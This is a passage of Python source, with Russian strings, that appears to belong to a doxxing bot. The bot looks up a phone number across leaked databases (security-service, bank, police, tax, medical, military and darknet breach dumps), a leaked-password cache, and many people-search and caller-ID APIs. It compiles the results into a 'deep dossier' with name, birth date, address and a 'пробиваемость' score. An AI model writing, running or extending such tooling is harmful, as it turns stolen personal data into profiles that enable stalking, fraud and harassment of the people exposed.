            load_new_db_insurance_extra(local_path, ext)
        elif "telecom_extra" in fname_lower:
            load_new_db_telecom_extra(local_path, ext)
        elif "isp_extra" in fname_lower:
            load_new_db_isp_extra(local_path, ext)
        elif "auto_extra" in fname_lower:
            load_new_db_auto_extra(local_path, ext)
        elif "pets_extra" in fname_lower:
            load_new_db_pets_extra(local_path, ext)
        elif "charity_extra" in fname_lower:
            load_new_db_charity_extra(local_path, ext)
        elif "religion_extra" in fname_lower:
            load_new_db_religion_extra(local_path, ext)
        elif "politics_extra" in fname_lower:
            load_new_db_politics_extra(local_path, ext)
        elif "military_extra2" in fname_lower:
            load_new_db_military_extra2(local_path, ext)
        elif "cyber_extra" in fname_lower:
            load_new_db_cyber_extra(local_path, ext)
        elif "darknet_extra" in fname_lower:
            load_new_db_darknet_extra(local_path, ext)
        elif "breach_extra" in fname_lower:
            load_new_db_breach_extra(local_path, ext)
        elif "sber" in fname_lower:
            load_sber_archives(local_path, ext)
        elif "avito" in fname_lower:
            load_avito_archives(local_path, ext)
        elif "wildberries" in fname_lower or "wb_" in fname_lower:
            load_wildberries_archives(local_path, ext)
        elif "ozon" in fname_lower:
            load_ozon_archives(local_path, ext)
        else:
            load_generic_phone_from_file(local_path, ext)
    for key in db_loaded:
        db_loaded[key] = True
    log("[DB] Динамическая загрузка завершена!")


# ================== ПОИСК ПО БАЗАМ ==================
def search_interbase(phone):
    return interbase_cache.get(normalize_phone(phone))


def search_getcontact(phone):
    return getcontact_cache.get(normalize_phone(phone), [])


def search_fsb_by_phone(phone):
    return fsb_cache.get(normalize_phone(phone), [])


def search_fsb_by_name(fio):
    key = fio.lower().strip()
    if key in fsb_by_name:
        return fsb_by_name[key]
    result = []
    for name, records in fsb_by_name.items():
        if key in name or name in key:
            result.extend(records)
    return result


def search_fsb_numbers(phone):
    return fsb_numbers.get(normalize_phone(phone), [])


def search_god_eye_by_phone(phone):
    return god_eye_by_phone.get(normalize_phone(phone), [])


def search_god_eye_by_username(username):
    return god_eye_by_username.get(username.lower().strip().lstrip("@"))


def search_god_eye_by_name(name):
    return god_eye_by_name.get(name.lower().strip(), [])


def search_tg_by_id(tg_id):
    return tg_db_by_id.get(str(tg_id).strip())


def search_tg_by_username(username):
    return tg_db_by_username.get(username.lower().strip().lstrip("@"))


def search_tg_by_phone(phone):
    return tg_db_by_phone.get(normalize_phone(phone), [])


def search_tg_by_name(name):
    key = name.lower().strip()
    if key in tg_db_by_name:
        return tg_db_by_name[key]
    result = []
    for n, recs in tg_db_by_name.items():
        if key in n or n in key:
            result.extend(recs)
    return result


def search_facebook_email(email):
    return facebook_emails_cache.get(email.strip().lower())


def search_facebook_by_local(local_part):
    return facebook_email_by_local.get(local_part.strip().lower(), [])


def search_facebook_by_name(name):
    name = name.strip().lower()
    result = []
    if "@" in name:
        rec = facebook_emails_cache.get(name)
        if rec:
            result.append(rec)
        local = name.split("@")[0]
    else:
        local = name
    result.extend(facebook_email_by_local.get(local, []))
    seen = set()
    uniq = []
    for r in result:
        k = r.get("email")
        if k and k not in seen:
            seen.add(k)
            uniq.append(r)
    return uniq


def search_sberbank(phone): return sberbank_cache.get(normalize_phone(phone), [])
def search_tinkoff(phone): return tinkoff_cache.get(normalize_phone(phone), [])
def search_vtb(phone): return vtb_cache.get(normalize_phone(phone), [])
def search_alfabank(phone): return alfabank_cache.get(normalize_phone(phone), [])
def search_gibdd(phone): return gibdd_cache.get(normalize_phone(phone), [])
def search_fns(phone): return fns_cache.get(normalize_phone(phone), [])
def search_pension(phone): return pension_cache.get(normalize_phone(phone), [])
def search_mvd(phone): return mvd_cache.get(normalize_phone(phone), [])
def search_fssp(phone): return fssp_cache.get(normalize_phone(phone), [])
def search_rosreestr(phone): return rosreestr_cache.get(normalize_phone(phone), [])
def search_avito(phone): return avito_cache.get(normalize_phone(phone), [])
def search_wildberries(phone): return wildberries_cache.get(normalize_phone(phone), [])
def search_ozon(phone): return ozon_cache.get(normalize_phone(phone), [])
def search_yandex_eda(phone): return yandex_eda_cache.get(normalize_phone(phone), [])
def search_vk(phone): return vk_cache.get(normalize_phone(phone), [])
def search_ok_db(phone): return ok_cache.get(normalize_phone(phone), [])
def search_mailru(phone): return mailru_cache.get(normalize_phone(phone), [])
def search_yandex(phone): return yandex_cache.get(normalize_phone(phone), [])
def search_gmail(phone): return gmail_cache.get(normalize_phone(phone), [])
def search_dl(phone): return dl_cache.get(normalize_phone(phone), [])
def search_medical(phone): return medical_cache.get(normalize_phone(phone), [])
def search_education(phone): return education_cache.get(normalize_phone(phone), [])
def search_military(phone): return military_cache.get(normalize_phone(phone), [])


def search_tiktok(phone): return tiktok_cache.get(normalize_phone(phone), [])
def search_instagram(phone): return instagram_cache.get(normalize_phone(phone), [])
def search_facebook(phone): return facebook_cache.get(normalize_phone(phone), [])
def search_twitter(phone): return twitter_cache.get(normalize_phone(phone), [])
def search_linkedin(phone): return linkedin_cache.get(normalize_phone(phone), [])
def search_snapchat(phone): return snapchat_cache.get(normalize_phone(phone), [])
def search_reddit(phone): return reddit_cache.get(normalize_phone(phone), [])
def search_telegram_db(phone): return telegram_cache.get(normalize_phone(phone), [])
def search_whatsapp_db(phone): return whatsapp_cache.get(normalize_phone(phone), [])
def search_viber_db(phone): return viber_cache.get(normalize_phone(phone), [])
def search_signal_db(phone): return signal_cache.get(normalize_phone(phone), [])
def search_discord_db(phone): return discord_cache.get(normalize_phone(phone), [])
def search_steam(phone): return steam_cache.get(normalize_phone(phone), [])
def search_twitch(phone): return twitch_cache.get(normalize_phone(phone), [])
def search_spotify(phone): return spotify_cache.get(normalize_phone(phone), [])
def search_netflix(phone): return netflix_cache.get(normalize_phone(phone), [])
def search_tinder(phone): return tinder_cache.get(normalize_phone(phone), [])
def search_badoo(phone): return badoo_cache.get(normalize_phone(phone), [])
def search_pinterest(phone): return pinterest_cache.get(normalize_phone(phone), [])
def search_tumblr(phone): return tumblr_cache.get(normalize_phone(phone), [])
def search_yandex_music(phone): return yandex_music_cache.get(normalize_phone(phone), [])
def search_vk_music(phone): return vk_music_cache.get(normalize_phone(phone), [])


def search_leaked_passwords(login):
    return leaked_passwords_cache.get(login.lower().strip(), [])


def search_generic_phone(phone):
    return generic_phone_cache.get(normalize_phone(phone), [])


def clean_getcontact_names(names):
    result = []
    seen = set()
    phone_re = re.compile(r"^[\+\d\s\-\(\)]{4,}$")
    date_re = re.compile(r"^\d{1,4}[\s\-\./]\d{1,2}([\s\-\./]\d{2,4})?$")
    code_re = re.compile(r"^\d{1,3}$")
    junk_re = re.compile(r"^[\s\.\,\-\_\?\@\!\#\$\%\^\&\*\(\)\[\]\{\}\/\\\|]+$")
    url_re = re.compile(r"^https?://", re.IGNORECASE)
    email_re = re.compile(r"^[\w\.\-]+@[\w\.\-]+$")
    for n in names:
        if not isinstance(n, str):
            continue
        s = n.strip()
        if not s or s in seen:
            continue
        if url_re.match(s) or email_re.match(s) or junk_re.match(s):
            continue
        if phone_re.match(s) or code_re.match(s) or date_re.match(s):
            continue
        if len(s) <= 2:
            continue
        digits = sum(1 for c in s if c.isdigit())
        if digits / len(s) > 0.5:
            continue
        printable = sum(1 for c in s if c.isprintable())
        if printable / max(len(s), 1) < 0.6:
            continue
        if not any(c.isalpha() for c in s):
            continue
        seen.add(s)
        result.append(s)
    return result


def check_phone_breaches(phone_e164):
    try:
        from xposedornot import XposedOrNot
        xon = XposedOrNot()
        result = xon.check_email(phone_e164)
        if result.breaches and len(result.breaches) > 0:
            return sorted(result.breaches)
    except Exception:
        pass
    return []


def check_phone_hudson(phone_e164):
    try:
        url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-phone?phone={phone_e164}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("data"):
                return len(data["data"])
    except Exception:
        pass
    return 0


def _format_db_block(title, emoji, data, limit=10):
    if not data:
        return ""
    block = f"{emoji} <b>{title} ({len(data)}):</b>\n"
    for d in data[:limit]:
        safe = str(d).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        block += f"  • {safe}\n"
    if len(data) > limit:
        block += f"  <i>... и ещё {len(data) - limit}</i>\n"
    return block


def build_phone_dossier(e164, all_data):
    score = 0
    factors = []
    if all_data.get("interbase"): score += 10; factors.append("Interbase")
    if all_data.get("getcontact"): score += 15; factors.append("Getcontact")
    if all_data.get("fsb"): score += 30; factors.append("ФСБ")
    if all_data.get("god_eye"): score += 20; factors.append("God_eye")
    if all_data.get("tg_records"): score += 20; factors.append("Telegram")
    if all_data.get("tg_phone", {}).get("registered"): score += 15; factors.append("TG live")
    if all_data.get("wa_phone", {}).get("registered"): score += 10; factors.append("WA live")
    if all_data.get("truecaller", {}).get("name"): score += 15; factors.append("Truecaller")
    if all_data.get("eyecon", {}).get("name"): score += 10; factors.append("Eyecon")
    if all_data.get("syncme", {}).get("name"): score += 10; factors.append("Sync.me")
    if all_data.get("ipqs", {}).get("fraud_score", 0) > 50: score += 5; factors.append("IPQS fraud")
    if all_data.get("sberbank"): score += 10; factors.append("Sberbank")
    if all_data.get("vk"): score += 5; factors.append("VK")
    if all_data.get("ok"): score += 5; factors.append("OK")
    if all_data.get("mailru"): score += 5; factors.append("Mail.ru")
    if all_data.get("spokeo", {}).get("found"): score += 5; factors.append("Spokeo")
    if all_data.get("beenverified", {}).get("found"): score += 5; factors.append("BeenVerified")
    if all_data.get("radaris", {}).get("found"): score += 5; factors.append("Radaris")
    if all_data.get("intelius", {}).get("found"): score += 5; factors.append("Intelius")
    if all_data.get("truepeoplesearch", {}).get("found"): score += 5; factors.append("TruePeopleSearch")
    if all_data.get("hibp_phone", {}).get("breaches"): score += 10; factors.append("HIBP")
    if all_data.get("dehashed", {}).get("entries"): score += 10; factors.append("DeHashed")
    if all_data.get("intelx_phone", {}).get("records"): score += 10; factors.append("IntelX")
    if all_data.get("fb_phone", {}).get("registered"): score += 5; factors.append("FB live")
    if all_data.get("ig_phone", {}).get("registered"): score += 5; factors.append("IG live")
    if all_data.get("tt_phone", {}).get("registered"): score += 5; factors.append("TikTok live")
    if all_data.get("apify_people", {}).get("fullName"): score += 20; factors.append("Apify People")
    if all_data.get("apify_tps", {}).get("name"): score += 15; factors.append("Apify TPS")
    if all_data.get("apify_enrich", {}).get("owner_name"): score += 10; factors.append("Apify Enrich")
    if all_data.get("truecaller_py", {}).get("name"): score += 10; factors.append("TruecallerPy")
    if all_data.get("getcontact_cli", {}).get("displayName"): score += 10; factors.append("GetContact CLI")
    if all_data.get("neutralino", {}).get("valid"): score += 5; factors.append("NeutrinoAPI")
    if all_data.get("telnyx", {}).get("carrier"): score += 5; factors.append("Telnyx")
    if all_data.get("signalwire", {}).get("carrier"): score += 5; factors.append("SignalWire")
    if all_data.get("bandwidth", {}).get("carrier"): score += 5; factors.append("Bandwidth")
    if all_data.get("plivo", {}).get("carrier"): score += 5; factors.append("Plivo")
    if all_data.get("commio", {}).get("carrier"): score += 5; factors.append("Commio")
    if all_data.get("numlookupapi", {}).get("valid"): score += 5; factors.append("NumLookupAPI")
    if all_data.get("thatsthem", {}).get("name"): score += 5; factors.append("That'sThem")
    for _k, _lbl in [
        ("tiktok", "TikTok"), ("instagram", "Instagram"), ("facebook", "Facebook"),
        ("twitter", "Twitter/X"), ("linkedin", "LinkedIn"), ("snapchat", "Snapchat"),
        ("reddit", "Reddit"), ("telegram_db", "Telegram DB"), ("whatsapp_db", "WhatsApp DB"),
        ("viber_db", "Viber DB"), ("signal_db", "Signal DB"), ("discord_db", "Discord"),
        ("steam", "Steam"), ("twitch", "Twitch"), ("spotify", "Spotify"),
        ("netflix", "Netflix"), ("tinder", "Tinder"), ("badoo", "Badoo"),
        ("pinterest", "Pinterest"), ("tumblr", "Tumblr"),
        ("yandex_music", "Yandex Music"), ("vk_music", "VK Music"),
    ]:
        if all_data.get(_k):
            score += 3
            factors.append(_lbl)
    for _k, _lbl in [
        ("tele2","Tele2"),("megafon","Megafon"),("mts","MTS"),("beeline","Beeline"),
        ("rostelecom","Rostelecom"),("yota","Yota"),("tinkoff_mobile","TinkoffMobile"),
        ("sber_mobile","SberMobile"),("vtb_mobile","VTBMobile"),("alfa_mobile","AlfaMobile"),
        ("raiffeisen","Raiffeisen"),("gazprombank","Gazprombank"),("rosselhoz","Rosselhoz"),
        ("otkritie","Otkritie"),("psb","PSB"),("sovcombank","Sovcombank"),("mkb","MKB"),
        ("uralsib","Uralsib"),("akbars","AkBars"),("rshb","RSHB"),("pochta_bank","PochtaBank"),
        ("home_credit","HomeCredit"),("citibank","Citibank"),("unicredit","UniCredit"),
        ("ing_bank","ING"),("mts_bank","MTSBank"),("yandex_bank","YandexBank"),
        ("ozon_bank","OzonBank"),("wildberries_bank","WBBank"),("avito_bank","AvitoBank"),
        ("gibdd_region","GIBDD-Region"),("gibdd_fines","GIBDD-Fines"),("gibdd_dtp","GIBDD-DTP"),
        ("fns_debt","FNS-Debt"),("fns_inn","FNS-INN"),("fns_ogrn","FNS-OGRN"),
        ("fssp_debt","FSSP-Debt"),("fssp_enforcement","FSSP-Enf"),
        ("mvd_wanted","MVD-Wanted"),("mvd_admin","MVD-Admin"),
        ("rosreestr_owner","Rosreestr-Owner"),("rosreestr_cadastr","Rosreestr-Cadastr"),
        ("rosreestr_deals","Rosreestr-Deals"),("pension_snils","Pension-SNILS"),
        ("pension_points","Pension-Points"),("pension_work","Pension-Work"),
        ("medical_oms","Medical-OMS"),("medical_dispensary","Medical-Disp"),
        ("medical_vaccination","Medical-Vac"),("education_school","Edu-School"),
        ("education_university","Edu-Univ"),("education_diploma","Edu-Diploma"),
        ("military_voenkomat","Mil-Voenkomat"),("military_rank","Mil-Rank"),
        ("military_service","Mil-Service"),
        ("telegram_premium","TG-Premium"),("telegram_bot","TG-Bot"),
        ("telegram_channel","TG-Channel"),("telegram_group","TG-Group"),
        ("telegram_stickers","TG-Stickers"),("telegram_gifts","TG-Gifts"),
        ("vk_friends","VK-Friends"),("vk_groups","VK-Groups"),("vk_photos","VK-Photos"),
        ("vk_audio","VK-Audio"),("vk_video","VK-Video"),("vk_messages","VK-Messages"),
        ("ok_friends","OK-Friends"),("ok_groups","OK-Groups"),("ok_photos","OK-Photos"),
        ("ok_audio","OK-Audio"),("ok_video","OK-Video"),
        ("mailru_files","Mailru-Files"),("mailru_photos","Mailru-Photos"),
        ("mailru_messages","Mailru-Msgs"),("yandex_files","Yandex-Files"),
        ("yandex_photos","Yandex-Photos"),("yandex_messages","Yandex-Msgs"),
        ("gmail_files","Gmail-Files"),("gmail_photos","Gmail-Photos"),
        ("gmail_messages","Gmail-Msgs"),
        ("tinder_matches","Tinder-Matches"),("badoo_matches","Badoo-Matches"),
        ("tantan","Tantan"),("mamba","Mamba"),("loveplanet","LovePlanet"),
        ("bumble","Bumble"),("okcupid","OkCupid"),("hinge","Hinge"),
        ("coffee_meets_bagel","CMB"),
        ("steam_games","Steam-Games"),("steam_friends","Steam-Friends"),
        ("steam_inventory","Steam-Inventory"),("steam_trades","Steam-Trades"),
        ("epicgames","EpicGames"),("gog","GOG"),("origin","Origin"),("uplay","Uplay"),
        ("battlenet","BattleNet"),("minecraft","Minecraft"),("roblox","Roblox"),
        ("fortnite","Fortnite"),("pubg","PUBG"),("csgo","CSGO"),("dota2","Dota2"),
        ("lol","LoL"),("wot","WoT"),("wows","WoWs"),("tanki","Tanki"),
        ("spotify_playlists","Spotify-Pl"),("spotify_followers","Spotify-Flw"),
        ("spotify_tracks","Spotify-Tr"),("apple_music","AppleMusic"),("deezer","Deezer"),
        ("soundcloud","SoundCloud"),("shazam","Shazam"),("lastfm","LastFM"),
        ("discogs","Discogs"),("bandcamp","Bandcamp"),
        ("yandex_music_playlists","YM-Pl"),("vk_music_playlists","VKM-Pl"),
        ("netflix_profiles","Netflix-Prof"),("netflix_history","Netflix-Hist"),
        ("ivi","IVI"),("okko","Okko"),("kinopoisk","Kinopoisk"),("amediateka","Amediateka"),
        ("more_tv","MoreTV"),("start","Start"),("wink","Wink"),("premier","Premier"),
        ("youtube","YouTube"),("twitch_subs","Twitch-Subs"),("rutube","Rutube"),
        ("vk_video2","VK-Video2"),
        ("tiktok_followers","TT-Flw"),("tiktok_likes","TT-Likes"),("tiktok_videos","TT-Videos"),
        ("instagram_followers","IG-Flw"),("instagram_posts","IG-Posts"),
        ("instagram_stories","IG-Stories"),
        ("facebook_friends","FB-Friends"),("facebook_posts","FB-Posts"),
        ("facebook_photos","FB-Photos"),("twitter_followers","TW-Flw"),
        ("twitter_tweets","TW-Tweets"),("linkedin_connections","LI-Conn"),
        ("linkedin_posts","LI-Posts"),("snapchat_friends","SC-Friends"),
        ("snapchat_stories","SC-Stories"),("reddit_posts","Reddit-Posts"),
        ("reddit_comments","Reddit-Comm"),("pinterest_boards","Pin-Boards"),
        ("pinterest_pins","Pin-Pins"),("tumblr_posts","Tumblr-Posts"),
        ("tumblr_followers","Tumblr-Flw"),
        ("leakcheck","LeakCheck"),("dehashed_extended","DeHashed-Ex"),
        ("intelx_extended","IntelX-Ex"),("snusbase","Snusbase"),
        ("weleakinfo","WeLeakInfo"),("leakedsource","LeakedSource"),
        ("hibp_extended","HIBP-Ex"),("firefox_monitor","FF-Monitor"),
        ("google_password_checkup","Google-PW"),("lastpass_breach","LastPass"),
        ("dropbox_breach","Dropbox"),("linkedin_breach","LinkedIn-Br"),
        ("adobe_breach","Adobe"),("myspace_breach","MySpace"),("tumblr_breach","Tumblr-Br"),
        ("canva_breach","Canva"),("chegg_breach","Chegg"),("wattpad_breach","Wattpad"),
        ("zynga_breach","Zynga"),("clubhouse_breach","Clubhouse"),
        ("facebook_breach","FB-Breach"),("instagram_breach","IG-Breach"),
        ("twitter_breach","TW-Breach"),("telegram_breach","TG-Breach"),
        ("vk_breach","VK-Breach"),("ok_breach","OK-Breach"),("mailru_breach","Mailru-Br"),
        ("yandex_breach","Yandex-Br"),("gmail_breach","Gmail-Br"),
        ("sber_breach","Sber-Breach"),("tinkoff_breach","Tinkoff-Br"),
        ("vtb_breach","VTB-Breach"),("alfa_breach","Alfa-Breach"),
        ("gibdd_breach","GIBDD-Br"),("fns_breach","FNS-Breach"),
        ("pension_breach","Pension-Br"),("mvd_breach","MVD-Breach"),
        ("fssp_breach","FSSP-Breach"),("rosreestr_breach","Rosreestr-Br"),
        ("medical_breach","Medical-Br"),("education_breach","Edu-Breach"),
        ("military_breach","Mil-Breach"),
        ("new_db_vk_extra","VK-Extra"),("new_db_ok_extra","OK-Extra"),
        ("new_db_telegram_extra","TG-Extra"),("new_db_steam_extra","Steam-Extra"),
        ("new_db_bank_extra","Bank-Extra"),("new_db_gov_extra","Gov-Extra"),
        ("new_db_leak_extra","Leak-Extra"),("new_db_market_extra","Market-Extra"),
        ("new_db_social_extra","Social-Extra"),("new_db_game_extra","Game-Extra"),
        ("new_db_music_extra","Music-Extra"),("new_db_video_extra","Video-Extra"),
        ("new_db_dating_extra","Dating-Extra"),("new_db_edu_extra","Edu-Extra"),
        ("new_db_med_extra","Med-Extra"),("new_db_mil_extra","Mil-Extra"),
        ("new_db_fin_extra","Fin-Extra"),("new_db_transport_extra","Transport-Extra"),
        ("new_db_realty_extra","Realty-Extra"),("new_db_job_extra","Job-Extra"),
        ("new_db_shop_extra","Shop-Extra"),("new_db_travel_extra","Travel-Extra"),
        ("new_db_insurance_extra","Insurance-Extra"),("new_db_telecom_extra","Telecom-Extra"),
        ("new_db_isp_extra","ISP-Extra"),("new_db_auto_extra","Auto-Extra"),
        ("new_db_pets_extra","Pets-Extra"),("new_db_charity_extra","Charity-Extra"),
        ("new_db_religion_extra","Religion-Extra"),("new_db_politics_extra","Politics-Extra"),
        ("new_db_military_extra2","Mil-Extra2"),("new_db_cyber_extra","Cyber-Extra"),
        ("new_db_darknet_extra","Darknet-Extra"),("new_db_breach_extra","Breach-Extra"),
    ]:
        if all_data.get(_k):
            score += 3
            factors.append(_lbl)
    level = "низкая" if score < 30 else "средняя" if score < 70 else "высокая"
    text = (
        f"🎯 <b>Глубокое досье по номеру</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Номер:</b> <code>{e164}</code>\n"
        f"<b>Оценка «пробиваемости»:</b> {score}/400 ({level})\n"
        f"<b>Найдено источников:</b> {len(factors)}\n\n"
        f"<b>Источники:</b> {', '.join(factors) if factors else '—'}\n"
    )
    return text


def lookup_phone(phone_input, region="RU"):
    try:
        parsed = phonenumbers.parse(phone_input, region)
    except phonenumbers.NumberParseException:
        return "❌ Не удалось распознать номер.", None
    if not phonenumbers.is_valid_number(parsed):
        return "❌ Номер невалиден.", None

    formatted = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    region_name = geocoder.description_for_number(parsed, "ru") or "—"
    operator = carrier.name_for_number(parsed, "ru") or "—"
    tz = ", ".join(timezone.time_zones_for_number(parsed)) or "—"

    type_map = {
        phonenumbers.PhoneNumberType.MOBILE: "📱 Мобильный",
        phonenumbers.PhoneNumberType.FIXED_LINE: "☎️ Стационарный",
        phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "☎️/📱 Смешанный",
        phonenumbers.PhoneNumberType.TOLL_FREE: "🆓 Бесплатный",
        phonenumbers.PhoneNumberType.PREMIUM_RATE: "💰 Платный",
        phonenumbers.PhoneNumberType.VOIP: "🌐 VoIP",
        phonenumbers.PhoneNumberType.UNKNOWN: "❓ Неизвестно",
    }
    line_type = type_map.get(phonenumbers.number_type(parsed), "❓ Неизвестно")

    breach_list = check_phone_breaches(e164)
    hibp_detailed = check_hibp_phone_detailed(e164)
    xon_detailed = check_xposedornot_phone_detailed(e164)
    hudson_count = check_phone_hudson(e164)
    htmlweb = check_htmlweb_phone(e164.replace("+", ""))
    veriphone = check_veriphone(e164.replace("+", ""))
    ok_info = check_ok_login(e164.replace("+", ""))

    numverify = check_numverify(e164.replace("+", ""))
    abstractapi = check_abstractapi(e164.replace("+", ""))
    ipqs = check_ipqs(e164.replace("+", ""))
    eyecon = check_eyecon(e164.replace("+", ""))
    syncme = check_syncme(e164.replace("+", ""))
    truecaller = check_truecaller(e164.replace("+", ""))
    getcontact_live = check_getcontact_live(e164.replace("+", ""))
    tg_phone = check_telegram_phone(e164.replace("+", ""))
    wa_phone = check_whatsapp(e164.replace("+", ""))
    viber_phone = check_viber(e164.replace("+", ""))
    mnp_info = check_mnp(e164.replace("+", ""))
    hlr_info = check_hlr(e164.replace("+", ""))

    twilio = check_twilio(e164.replace("+", ""))
    vonage = check_vonage(e164.replace("+", ""))
    telesign = check_telesign(e164.replace("+", ""))
    numlookup = check_numlookup(e164.replace("+", ""))
    melissa = check_melissa(e164.replace("+", ""))
    whitepages = check_whitepages(e164.replace("+", ""))
    zaba = check_zaba(e164.replace("+", ""))
    callapp = check_callapp(e164.replace("+", ""))
    hiya = check_hiya(e164.replace("+", ""))
    mrnumber = check_mrnumber(e164.replace("+", ""))
    shouldianswer = check_shouldianswer(e164.replace("+", ""))
    tellows = check_tellows(e164.replace("+", ""))
    ktozvonil = check_ktozvonil(e164.replace("+", ""))
    zvonili = check_zvonili(e164.replace("+", ""))
    getipintel = check_getipintel(e164.replace("+", ""))

    spokeo = check_spokeo(e164.replace("+", ""))
    whitepages_people = check_whitepages_people(e164.replace("+", ""))
    beenverified = check_beenverified(e164.replace("+", ""))
    radaris = check_radaris(e164.replace("+", ""))
    intelius = check_intelius(e164.replace("+", ""))
    truthfinder = check_truthfinder(e164.replace("+", ""))
    fastpeoplesearch = check_fastpeoplesearch(e164.replace("+", ""))
    truepeoplesearch = check_truepeoplesearch(e164.replace("+", ""))
    peoplefinders = check_peoplefinders(e164.replace("+", ""))
    mylife = check_mylife(e164.replace("+", ""))
    hibp_phone = check_hibp_phone(e164.replace("+", ""))
    dehashed = check_dehashed(e164.replace("+", ""))
    intelx_phone = check_intelx_phone(e164.replace("+", ""))
    ipqs_phone = check_ipqs_phone(e164.replace("+", ""))
    hlrlookup = check_hlrlookup(e164.replace("+", ""))
    telesign_phoneid = check_telesign_phoneid(e164.replace("+", ""))
    vonage_ni = check_vonage_ni(e164.replace("+", ""))
    twilio_lookup = check_twilio_lookup(e164.replace("+", ""))
    fb_phone = check_facebook_phone(e164.replace("+", ""))
    ig_phone = check_instagram_phone(e164.replace("+", ""))
    li_phone = check_linkedin_phone(e164.replace("+", ""))
    snap_phone = check_snapchat_phone(e164.replace("+", ""))
    tt_phone = check_tiktok_phone(e164.replace("+", ""))
    tw_phone = check_twitter_phone(e164.replace("+", ""))

    apify_people = check_apify_people_search(e164.replace("+", ""))
    truecaller_py = check_truecaller_py(e164.replace("+", ""))
    getcontact_cli = check_getcontact_cli(e164.replace("+", ""))

    apify_tps = check_apify_truepeoplesearch(e164, is_phone=True)
    apify_enrich = check_apify_phone_enrichment(e164)
    numlookupapi_new = check_numlookupapi(e164.replace("+", ""), "RU")
    thatsthem = check_thatsthem(e164)

    neutralino = check_neutralino(e164.replace("+", ""))
    telnyx = check_telnyx(e164.replace("+", ""))
    signalwire = check_signalwire(e164.replace("+", ""))
    bandwidth = check_bandwidth(e164.replace("+", ""))
    plivo = check_plivo(e164.replace("+", ""))
    commio = check_commio(e164.replace("+", ""))

    interbase_data = search_interbase(e164)
    getcontact_names = clean_getcontact_names(search_getcontact(e164))
    fsb_records = search_fsb_by_phone(e164)
    fsb_num_labels = search_fsb_numbers(e164)
    god_eye_records = search_god_eye_by_phone(e164)
    tg_records = search_tg_by_phone(e164)

    sberbank_data = search_sberbank(e164)
    tinkoff_data = search_tinkoff(e164)
    vtb_data = search_vtb(e164)
    alfabank_data = search_alfabank(e164)
    gibdd_data = search_gibdd(e164)
    fns_data = search_fns(e164)
    pension_data = search_pension(e164)
    mvd_data = search_mvd(e164)
    fssp_data = search_fssp(e164)
    rosreestr_data = search_rosreestr(e164)
    avito_data = search_avito(e164)
    wildberries_data = search_wildberries(e164)
    ozon_data = search_ozon(e164)
    yandex_eda_data = search_yandex_eda(e164)
    vk_data = search_vk(e164)
    ok_data = search_ok_db(e164)
    mailru_data = search_mailru(e164)
    yandex_data = search_yandex(e164)
    gmail_data = search_gmail(e164)
    dl_data = search_dl(e164)
    medical_data = search_medical(e164)
    education_data = search_education(e164)
    military_data = search_military(e164)
    leaked_passwords = search_leaked_passwords(e164)
    generic_data = search_generic_phone(e164)

    tiktok_data = search_tiktok(e164)
    instagram_data = search_instagram(e164)
    facebook_data = search_facebook(e164)
    twitter_data = search_twitter(e164)
    linkedin_data = search_linkedin(e164)
    snapchat_data = search_snapchat(e164)
    reddit_data = search_reddit(e164)
    telegram_db_data = search_telegram_db(e164)
    whatsapp_db_data = search_whatsapp_db(e164)
    viber_db_data = search_viber_db(e164)
    signal_db_data = search_signal_db(e164)
    discord_db_data = search_discord_db(e164)
    steam_data = search_steam(e164)
    twitch_data = search_twitch(e164)
    spotify_data = search_spotify(e164)
    netflix_data = search_netflix(e164)
    tinder_data = search_tinder(e164)
    badoo_data = search_badoo(e164)
    pinterest_data = search_pinterest(e164)
    tumblr_data = search_tumblr(e164)
    yandex_music_data = search_yandex_music(e164)
    vk_music_data = search_vk_music(e164)

    dossier_data = {
        "interbase": interbase_data, "getcontact": getcontact_names,
        "fsb": fsb_records, "god_eye": god_eye_records, "tg_records": tg_records,
        "tg_phone": tg_phone, "wa_phone": wa_phone, "truecaller": truecaller,
        "eyecon": eyecon, "syncme": syncme, "ipqs": ipqs,
        "sberbank": sberbank_data, "vk": vk_data, "ok": ok_data, "mailru": mailru_data,
        "spokeo": spokeo, "beenverified": beenverified,
        "radaris": radaris, "intelius": intelius,
        "truepeoplesearch": truepeoplesearch,
        "hibp_phone": hibp_phone, "dehashed": dehashed,
        "intelx_phone": intelx_phone,
        "fb_phone": fb_phone, "ig_phone": ig_phone, "tt_phone": tt_phone,
        "apify_people": apify_people, "apify_tps": apify_tps, "apify_enrich": apify_enrich,
        "truecaller_py": truecaller_py, "getcontact_cli": getcontact_cli,
        "numlookupapi": numlookupapi_new, "thatsthem": thatsthem,
        "neutralino": neutralino, "telnyx": telnyx, "signalwire": signalwire,
        "bandwidth": bandwidth, "plivo": plivo, "commio": commio,
        "tiktok": tiktok_data, "instagram": instagram_data, "facebook": facebook_data,
        "twitter": twitter_data, "linkedin": linkedin_data, "snapchat": snapchat_data,
        "reddit": reddit_data, "telegram_db": telegram_db_data,
        "whatsapp_db": whatsapp_db_data, "viber_db": viber_db_data,
        "signal_db": signal_db_data, "discord_db": discord_db_data,
        "steam": steam_data, "twitch": twitch_data, "spotify": spotify_data,
        "netflix": netflix_data, "tinder": tinder_data, "badoo": badoo_data,
        "pinterest": pinterest_data, "tumblr": tumblr_data,
        "yandex_music": yandex_music_data, "vk_music": vk_music_data,
    }
    text = build_phone_dossier(e164, dossier_data) + "\n"

    identity_text = ""
    if apify_people and apify_people.get("fullName"):
        identity_text += "━━━━━━━━━━━━━━━━━━\n👤 <b>ЛИЧНОСТЬ (Apify):</b>\n"
        identity_text += f"  <b>ФИО:</b> {apify_people['fullName']}\n"
        if apify_people.get("age"):
            identity_text += f"  <b>Возраст:</b> {apify_people['age']}\n"
        if apify_people.get("dobMonth") and apify_people.get("dobYear"):
            identity_text += f"  <b>Дата рождения:</b> {apify_people['dobMonth']}/{apify_people['dobYear']}\n"
        if apify_people.get("currentAddress"):
            identity_text += f"  <b>Адрес:</b> {apify_people['currentAddress']}\n"
        if apify_people.get("matchScore"):
            identity_text += f"  <b>Match score:</b> {apify_people['matchScore']}\n"
        identity_text += "\n"
    elif apify_tps and apify_tps.get("name"):
